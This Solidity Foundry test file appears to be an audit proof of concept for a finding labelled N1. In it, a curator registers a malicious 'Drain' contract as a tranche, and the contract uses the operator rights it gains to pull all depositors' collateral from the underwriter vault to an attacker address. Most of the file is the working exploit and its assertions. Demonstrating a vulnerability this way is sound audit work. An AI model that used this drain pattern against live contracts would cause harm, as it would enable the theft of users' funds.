// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { Underwriter } from "../../../../../contracts/cap/Underwriter.sol";
import { IVault } from "../../../../../contracts/interfaces/IVault.sol";
import { CapDeployer } from "../../../../../test/shared/CapDeployer.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { console } from "forge-std/console.sol";

/// N1: a curator-registered "tranche" is handed ERC-6909 operator rights over the underwriter and
/// pulls every depositor's balance out. Nothing in addTranche checks the address.
contract Drain {
    function optIn() external { }

    function pull(address vault, address from, address asset, address to) external returns (uint256 moved) {
        moved = IVault(vault).balanceOf(from, asset);
        IVault(vault).transferFrom(from, to, asset, moved);
    }
}

contract N3_CuratorDrain is CapDeployer {
    Underwriter uw;
    Drain drain;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("curatorEOA");

    function setUp() public {
        _deployCap();
        uw = _deployUnderwriter(); // curator operator == address(this)
        _fundUnderwriter(address(uw), alice, 1_000e18);
        _fundUnderwriter(address(uw), bob, 500e18);
        drain = new Drain();
    }

    function test_N1_curatorDrainsIdleBalance() public {
        uint256 tvl = uw.totalAssets();
        assertEq(tvl, 1_500e18);
        assertFalse(vault.isOperator(address(uw), address(drain)));

        uw.addTranche(address(drain)); // curator role only
        assertTrue(vault.isOperator(address(uw), address(drain)));

        uint256 moved = drain.pull(address(vault), address(uw), address(collateral), attacker);
        console.log("moved from underwriter (wei):", moved);
        assertEq(moved, tvl, "100% of TVL leaves in one call");
        assertEq(vault.balanceOf(address(uw), address(collateral)), 0);
        assertEq(uw.totalAssets(), 0, "depositors' shares are now worth nothing");

        // the curator cashes out to plain ERC-20
        vm.prank(attacker);
        vault.withdraw(address(collateral), moved, attacker);
        assertEq(IERC20(address(collateral)).balanceOf(attacker), tvl);

        // depositors' shares are worth nothing
        assertEq(uw.previewRedeem(uw.balanceOf(alice)), 0);
        assertEq(uw.previewRedeem(uw.balanceOf(bob)), 0);
    }

    function test_N1_allocatedPortionIsReachableToo() public {
        MarketBundle memory b = _createMarketBundle("M");
        _admitDepositor(b.tranche0Addr, address(uw));
        uw.addTranche(b.tranche0Addr);
        uw.allocate(b.tranche0Addr, 1_000e18);
        assertEq(vault.balanceOf(address(uw), address(collateral)), 500e18, "1000 allocated, 500 idle");

        // no debt on the market -> everything is instantly unlocked; deallocate returns it to the vault
        uw.deallocate(b.tranche0Addr, b.tranche0.balanceOf(address(uw)));
        uint256 idle = vault.balanceOf(address(uw), address(collateral));
        console.log("idle after deallocate (wei):", idle);
        assertGe(idle, 1_500e18 - 1e6, "back to ~full TVL less dead-share dust");

        uw.addTranche(address(drain));
        uint256 moved = drain.pull(address(vault), address(uw), address(collateral), attacker);
        assertEq(moved, idle);
        assertEq(uw.totalAssets(), uw.totalDebt(), "only the unreachable recorded mark remains");
    }

    function test_N1_removeTrancheDoesNotHelpAfterTheFact() public {
        uw.addTranche(address(drain));
        drain.pull(address(vault), address(uw), address(collateral), attacker);
        // removeTranche reverts inside _report on a non-tranche; the operator right can only be
        // revoked by an ADMIN-level fix, and the balance is already gone anyway
        vm.expectRevert();
        uw.removeTranche(address(drain));
    }
}
